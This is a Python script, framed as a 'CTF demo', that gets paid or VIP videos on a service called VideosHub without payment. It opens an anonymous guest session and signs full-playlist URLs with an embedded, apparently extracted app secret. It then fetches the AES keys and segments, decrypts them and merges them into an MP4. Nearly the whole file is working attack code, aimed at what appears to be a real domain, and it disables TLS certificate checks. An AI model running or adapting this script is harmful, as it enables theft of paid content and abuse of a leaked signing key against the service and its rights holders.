#!/usr/bin/env python3
"""
VideosHub CTF demo: watch paid/VIP HLS video without payment.

Demo only. Reuses the in-app HMAC key that signs media URLs to request full playlists.

Basic flow:
  1. anonymous device login (guest session)
  2. get a video id (random or --video-id)
  3. fetch /api/videos/{id}/preview to obtain preview host/path/line
  4. sign /api/s3/p2/full/{id}/{pathLine}/{quality}/index.m3u8
  5. download full m3u8, AES key, segments
  6. decrypt segments into an output directory
"""
import argparse, base64, hashlib, hmac, json, os, re, random, shutil, ssl, subprocess, sys, time, urllib.request, urllib.parse, urllib.error

BASE = "https://d26fh0cuir1thg.r78k4dw47n.asia"
SECRET = "6b5hR#7uVhJPZT1zAgA26fPSyx9Zh!Za"
UA = "Mozilla/5.0"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


# ---------------- protobuf helpers ----------------
def vint(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        out.append(b | 0x80 if n else b)
        if not n:
            break
    return bytes(out)


def read_varint(b: bytes, i: int):
    r = 0
    s = 0
    while True:
        x = b[i]; i += 1
        r |= (x & 0x7f) << s
        s += 7
        if not x & 0x80:
            return r, i


def fs(field: int, s: str) -> bytes:
    bb = s.encode()
    return vint((field << 3) | 2) + vint(len(bb)) + bb


def fields(b: bytes):
    i = 0
    out = []
    try:
        while i < len(b):
            t, i = read_varint(b, i)
            fn = t >> 3
            wt = t & 7
            if wt == 0:
                val, i = read_varint(b, i); out.append((fn, 0, val))
            elif wt == 2:
                L, i = read_varint(b, i); out.append((fn, 2, b[i:i + L])); i += L
            elif wt == 1:
                out.append((fn, 1, b[i:i + 8])); i += 8
            elif wt == 5:
                out.append((fn, 5, b[i:i + 4])); i += 4
            else:
                break
    except Exception:
        pass
    return out


def field_bytes(ff, num):
    return next((f[2] for f in ff if f[0] == num and f[1] == 2), b"")


# ---------------- HTTP / signing helpers ----------------
def api_sign(method: str, pathname: str, query: str, ts: int, dev: str) -> str:
    # sign path = URL pathname after removing leading "/api"
    sign_path = re.sub(r"^/api", "", pathname)
    msg = "\n".join([SECRET, method.upper(), sign_path, query, str(ts), dev])
    return hashlib.sha256(msg.encode()).hexdigest()


class Client:
    def __init__(self):
        # stable guest device id used for API signing
        self.dev = "".join(random.choices("0123456789abcdef", k=32))
        self.cookie = ""
        self.session = None

    def request(self, method, url, body=b"", auth=False):
        parsed = urllib.parse.urlparse(url)
        pathname = parsed.path
        query = parsed.query
        ts = int(time.time())
        nonce = "".join(random.choices("0123456789abcdef", k=16))
        headers = {
            "Accept": "application/x-protobuf",
            "X-Device-Id": self.dev,
            "X-Timestamp": str(ts),
            "X-Nonce": nonce,
            "X-Sign": api_sign(method, pathname, query, ts, self.dev),
            "X-Client-Platform": "h5",
            "User-Agent": UA,
        }
        if auth and self.session:
            headers["Authorization"] = "Bearer " + self.session
        if self.cookie:
            headers["Cookie"] = self.cookie
        if body:
            headers["Content-Type"] = "application/x-protobuf"
        req = urllib.request.Request(url, data=body if body else None, headers=headers, method=method)
        try:
            resp = urllib.request.urlopen(req, timeout=20, context=ctx)
        except urllib.error.HTTPError as e:
            resp = e
        data = resp.read()
        # persist cookies set by login etc.
        for h in resp.headers.get_all("Set-Cookie") or []:
            name_val = h.split(";", 1)[0]
            if "=" in name_val and name_val.lower().startswith(("ma_sid=", "store=")):
                self.cookie = (self.cookie + "; " + name_val).strip("; ")
        enc = (resp.headers.get("X-Protobuf-Response-Encoding") or "").strip().lower()
        raw = base64.b64decode(data) if enc == "base64" else data
        return resp.status, raw, resp.headers

    def protobuf_call(self, method, pathname, body=b"", auth=True):
        # pathname examples: "/api/v1/...", "/api/videos/..."
        status, raw, headers = self.request(method, BASE + pathname, body=body, auth=auth)
        env = fields(raw)
        code = next((f[2] for f in env if f[0] == 1 and f[1] == 0), 0)
        msgbytes = field_bytes(env, 2)
        msg = msgbytes.decode("utf-8", "replace")
        data = field_bytes(env, 3)
        if code != 0:
            raise RuntimeError(f"[{pathname}] api code={code} msg={msg}")
        return data

    def login(self):
        body = fs(1, self.dev) + fs(2, "web") + fs(3, "h5b") + fs(4, "h5:1")
        data = self.protobuf_call("POST", "/api/v1/auth/device", body=body, auth=False)
        kte = fields(data)
        self.session = field_bytes(kte, 7).decode()
        return self.session


def decode_list(data):
    page = fields(data)
    vids = []
    for f in page:
        if f[0] == 1 and f[1] == 2:
            d = {}
            for x in fields(f[2]):
                if x[1] == 0:
                    d[x[0]] = x[2]
                elif x[1] == 2:
                    try:
                        s = x[2].decode()
                        d[x[0]] = s if all(32 <= ord(c) < 127 for c in s) else x[2].hex()
                    except Exception:
                        d[x[0]] = x[2].hex()
            vids.append(d)
    return vids


def fetch_preview_url(client, vid):
    data = client.protobuf_call("GET", f"/api/videos/{vid}/preview")
    top = fields(data)
    play = field_bytes(top, 5)
    prim = field_bytes(fields(play), 1)
    return field_bytes(fields(prim), 2).decode()


def media_sign(video_id, line, quality, rel_path, ts, nonce):
    msg = "|".join(["full", str(video_id), line, quality, rel_path, str(ts), nonce])
    return hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()[:16]


def plan_playlist(vid, preview_url, quality="1080p"):
    u = urllib.parse.urlparse(preview_url)
    host = u.scheme + "://" + u.netloc
    segs = [x for x in u.path.split("/") if x]
    i = segs.index("p2")
    mode, video, path_line, variant = segs[i + 1:i + 5]
    line = urllib.parse.parse_qs(u.query).get("line", [None])[0]
    ts = int(time.time()) - 3
    nonce = "".join(random.choices("0123456789abcdef", k=16))
    s = media_sign(video, line, quality, "index.m3u8", ts, nonce)
    full_url = (f"{host}/api/s3/p2/full/{video}/{path_line}/{quality}/index.m3u8"
                f"?line={line}&t={ts}&n={nonce}&s={s}")
    return full_url, host, video, path_line, quality, line


def detect_url_kind(url: str) -> str:
    """Classify a user-supplied URL.

    Returns "playlist" for a direct .m3u8 URL (used as-is, no signing needed),
    "preview" for a preview media URL that must be signed into a full playlist,
    or raises ValueError naming what was seen.
    """
    p = urllib.parse.urlparse(url)
    if p.scheme not in ("http", "https", "file"):
        raise ValueError(f"unsupported URL scheme {p.scheme!r}: {url}")
    if p.path.lower().endswith(".m3u8"):
        return "playlist"
    segs = [x for x in p.path.split("/") if x]
    if "p2" in segs:
        if "preview" in segs:
            return "preview"
        raise ValueError(
            "this is a /p2/ URL but neither a preview nor an .m3u8 playlist; "
            f"expected .../p2/preview/... or .../index.m3u8, got: {p.path}"
        )
    raise ValueError(
        "unrecognised URL: expected a full playlist ending in .m3u8 "
        f"or a preview URL containing /p2/preview/, got: {p.path}"
    )


def fetch_bytes(url, referer=None, retries=3):
    """GET a URL with retries. Retries matter mid-download: one transient failure
    would otherwise throw away a long segment run."""
    last = None
    for attempt in range(1, retries + 1):
        headers = {"User-Agent": UA}
        if referer:
            headers["Referer"] = referer
        try:
            req = urllib.request.Request(url, headers=headers)
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            return resp.read()
        except Exception as e:  # URLError, HTTPError, timeout, ...
            last = e
            if attempt < retries:
                time.sleep(min(2 ** attempt * 0.5, 4))
    raise RuntimeError(f"failed to fetch {url} after {retries} attempts: {last}")


# ---------------- AES-128-CBC ----------------
# Tables and inverse cipher for the pure-Python fallback below.
_SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]
_INV_SBOX = [0] * 256
for _i, _v in enumerate(_SBOX):
    _INV_SBOX[_v] = _i
_RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]


def _xtime(a):
    a <<= 1
    return (a ^ 0x1b) & 0xff if a & 0x100 else a


def _mul(a, b):
    r = 0
    while b:
        if b & 1:
            r ^= a
        a = _xtime(a)
        b >>= 1
    return r & 0xff


def _expand_key(key):
    """AES-128 key schedule -> 11 round keys of 16 bytes."""
    if len(key) != 16:
        raise ValueError(f"AES-128 needs a 16-byte key, got {len(key)}")
    w = [list(key[i * 4:i * 4 + 4]) for i in range(4)]
    for i in range(4, 44):
        t = list(w[i - 1])
        if i % 4 == 0:
            t = t[1:] + t[:1]
            t = [_SBOX[b] for b in t]
            t[0] ^= _RCON[i // 4 - 1]
        w.append([w[i - 4][j] ^ t[j] for j in range(4)])
    return [bytes(b for word in w[r * 4:r * 4 + 4] for b in word) for r in range(11)]


def _inv_shift_rows(s):
    # state is column-major: byte (r, c) lives at s[r + 4*c]
    out = [0] * 16
    for r in range(4):
        for c in range(4):
            out[r + 4 * c] = s[r + 4 * ((c - r) % 4)]
    return out


def _inv_mix_columns(s):
    out = [0] * 16
    for c in range(4):
        a = s[4 * c:4 * c + 4]
        out[4 * c + 0] = _mul(a[0], 14) ^ _mul(a[1], 11) ^ _mul(a[2], 13) ^ _mul(a[3], 9)
        out[4 * c + 1] = _mul(a[0], 9) ^ _mul(a[1], 14) ^ _mul(a[2], 11) ^ _mul(a[3], 13)
        out[4 * c + 2] = _mul(a[0], 13) ^ _mul(a[1], 9) ^ _mul(a[2], 14) ^ _mul(a[3], 11)
        out[4 * c + 3] = _mul(a[0], 11) ^ _mul(a[1], 13) ^ _mul(a[2], 9) ^ _mul(a[3], 14)
    return out


def _decrypt_block(block, rks):
    s = [block[i] ^ rks[10][i] for i in range(16)]
    for rnd in range(9, 0, -1):
        s = [_INV_SBOX[b] for b in s]
        s = _inv_shift_rows(s)
        s = [s[i] ^ rks[rnd][i] for i in range(16)]
        s = _inv_mix_columns(s)
    s = [_INV_SBOX[b] for b in s]
    s = _inv_shift_rows(s)
    return bytes(s[i] ^ rks[0][i] for i in range(16))


def _aes128_cbc_decrypt_py(key: bytes, iv: bytes, data: bytes) -> bytes:
    """Pure-Python AES-128-CBC decrypt with PKCS#7 unpadding.

    Used when the openssl CLI is absent (e.g. a bare Windows box)."""
    if len(data) % 16:
        raise ValueError(f"ciphertext is not a multiple of 16 bytes: {len(data)}")
    rks = _expand_key(key)
    prev = iv
    out = bytearray()
    for off in range(0, len(data), 16):
        blk = data[off:off + 16]
        dec = _decrypt_block(blk, rks)
        out += bytes(dec[i] ^ prev[i] for i in range(16))
        prev = blk
    if out:
        pad = out[-1]
        if 1 <= pad <= 16 and out[-pad:] == bytes([pad]) * pad:
            del out[-pad:]
    return bytes(out)


def aes128_cbc_decrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    """Prefer the openssl CLI; fall back to the bundled pure-Python cipher."""
    exe = shutil.which("openssl")
    if exe:
        proc = subprocess.run(
            [exe, "enc", "-d", "-aes-128-cbc", "-K", key.hex(), "-iv", iv.hex()],
            input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        if proc.returncode == 0:
            return proc.stdout
        print(f"[!] openssl failed ({proc.stderr.decode('utf-8', 'replace').strip()}); "
              "falling back to the built-in AES", file=sys.stderr)
    return _aes128_cbc_decrypt_py(key, iv, data)


def parse_playlist(text):
    """Return list of (seg_name, key_name, iv_bytes)."""
    base_seq = 0
    current_key = None
    current_iv = b"\x00" * 16
    seq = 0
    segs = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#EXT-X-MEDIA-SEQUENCE:"):
            base_seq = int(line.split(":", 1)[1])
            seq = base_seq
            continue
        if line.startswith("#EXT-X-KEY:"):
            m = re.search(r'URI="([^"]+)"', line)
            if m:
                current_key = m.group(1)
            ivm = re.search(r"IV=0x([0-9a-fA-F]+)", line)
            if ivm:
                current_iv = bytes.fromhex(ivm.group(1).zfill(32))
            else:
                current_iv = seq.to_bytes(16, "big")
            continue
        if line.startswith("#"):
            continue
        # segment line; if no explicit IV in the preceding key octet
        if current_key is not None:
            segs.append((line, current_key, current_iv))
        seq += 1
    return segs


def download_and_merge(full_url, outdir, out_name="output", max_segments=0,
                       keep_ts=True):
    """Download the playlist, decrypt every segment, concatenate them in order,
    then remux the result into a single .mp4 when ffmpeg is available.

    Returns the path of the finished media file. max_segments <= 0 means all.
    """
    playlist = fetch_bytes(full_url).decode("utf-8", "replace")
    segs = parse_playlist(playlist)
    if not segs:
        raise RuntimeError(
            "no encrypted segments parsed from the playlist; the m3u8 may be a "
            "master playlist (referencing other playlists) rather than a media "
            "playlist with #EXT-X-KEY"
        )
    base = full_url.rsplit("/", 1)[0] + "/"
    os.makedirs(outdir, exist_ok=True)

    total = len(segs) if max_segments <= 0 else min(len(segs), max_segments)
    ts_path = os.path.join(outdir, f"{out_name}.ts")
    key_cache = {}
    written = 0
    print(f"[*] playlist has {len(segs)} segments; downloading {total}", file=sys.stderr)

    # Concatenate as we go: no per-segment files, no second copy of the data.
    with open(ts_path, "wb") as out:
        for idx, (seg_name, key_name, iv) in enumerate(segs[:total]):
            key_url = key_name if key_name.startswith(("http://", "https://")) else base + key_name
            seg_url = seg_name if seg_name.startswith(("http://", "https://")) else base + seg_name
            if key_url not in key_cache:
                key_cache[key_url] = fetch_bytes(key_url, referer=full_url)
            key = key_cache[key_url]
            enc = fetch_bytes(seg_url, referer=full_url)
            if len(key) != 16:
                raise RuntimeError(f"AES-128 key at {key_url} is {len(key)} bytes, expected 16")
            dec = aes128_cbc_decrypt(key, iv, enc)
            out.write(dec)
            written += 1
            print(f"[+] {idx + 1}/{total} {seg_url.rsplit('/', 1)[-1]} "
                  f"({len(enc)} -> {len(dec)} bytes)", file=sys.stderr)

    ts_size = os.path.getsize(ts_path)
    print(f"[*] wrote {written} segments, {ts_size} bytes -> {ts_path}", file=sys.stderr)

    mp4_path = os.path.join(outdir, f"{out_name}.mp4")
    ffmpeg = shutil.which("ffmpeg")
    if not ffmpeg:
        print("[!] ffmpeg not found on PATH; leaving the concatenated .ts in place. "
              "It plays as-is in most players, and can be remuxed later with:\n"
              f"    ffmpeg -i \"{ts_path}\" -c copy -bsf:a aac_adtstoasc \"{mp4_path}\"",
              file=sys.stderr)
        return ts_path

    print(f"[*] remuxing to {mp4_path}", file=sys.stderr)
    proc = subprocess.run(
        [ffmpeg, "-y", "-loglevel", "error", "-i", ts_path,
         "-c", "copy", "-bsf:a", "aac_adtstoasc", mp4_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    # Success means exit 0 AND a non-empty file; never claim success otherwise.
    if proc.returncode != 0 or not os.path.exists(mp4_path) or os.path.getsize(mp4_path) == 0:
        err = proc.stderr.decode("utf-8", "replace").strip()
        print(f"[!] ffmpeg remux failed (exit {proc.returncode}): {err}\n"
              f"    the concatenated stream is still at {ts_path}", file=sys.stderr)
        return ts_path

    print(f"[*] mp4 written: {mp4_path} ({os.path.getsize(mp4_path)} bytes)", file=sys.stderr)
    if not keep_ts:
        os.remove(ts_path)
    return mp4_path


def resolve_playlist_url(url, quality):
    """Turn a user-supplied URL into a full playlist URL.

    A .m3u8 URL is already complete and is used verbatim, with no login and no
    signing. A preview URL is signed into a full playlist using the in-app key.
    """
    kind = detect_url_kind(url)
    if kind == "playlist":
        print("[*] treating the URL as a signed full playlist; no login or signing needed",
              file=sys.stderr)
        return url
    c = Client()
    c.login()
    full_url, host, video, path_line, q, line = plan_playlist(None, url, quality)
    print(f"[*] signed full playlist for video {video} at {q}", file=sys.stderr)
    return full_url


def main():
    ap = argparse.ArgumentParser(
        description="Download an HLS video from a full URL and merge the segments "
                    "into one file.")
    ap.add_argument("url", nargs="?",
                    help="full URL: either a signed playlist ending in .m3u8 "
                         "(used as-is) or a preview URL containing /p2/preview/ "
                         "(signed with the in-app key). Omit to pick a random video.")
    ap.add_argument("--video-id", help="specific video id; default picks randomly from first list page")
    ap.add_argument("--quality", default="1080p", choices=["480p", "720p", "1080p"])
    ap.add_argument("--max-segments", type=int, default=0,
                    help="download at most N segments (default 0 = all)")
    ap.add_argument("--outdir", default="./videoshub_out")
    ap.add_argument("--out-name", default="output", help="base name for the output files")
    ap.add_argument("--drop-ts", action="store_true",
                    help="delete the intermediate .ts once the .mp4 is written")
    args = ap.parse_args()

    if args.url:
        full_url = resolve_playlist_url(args.url, args.quality)
    else:
        c = Client()
        c.login()
        video_id = args.video_id
        if not video_id:
            data = c.protobuf_call("GET", "/api/v1/video/list?page=1&page_size=30")
            vids = decode_list(data)
            ids = [v.get(1) for v in vids if v.get(1)]
            if not ids:
                raise SystemExit("no videos found")
            video_id = random.choice(ids)
        preview_url = fetch_preview_url(c, str(video_id))
        full_url, host, video, path_line, quality, line = plan_playlist(
            video_id, preview_url, args.quality)
        print(f"[*] video id = {video_id}")

    print(f"[*] playlist URL = {full_url}")
    final = download_and_merge(full_url, args.outdir, args.out_name,
                               args.max_segments, keep_ts=not args.drop_ts)
    print(f"[*] done: {final}")


if __name__ == "__main__":
    main()
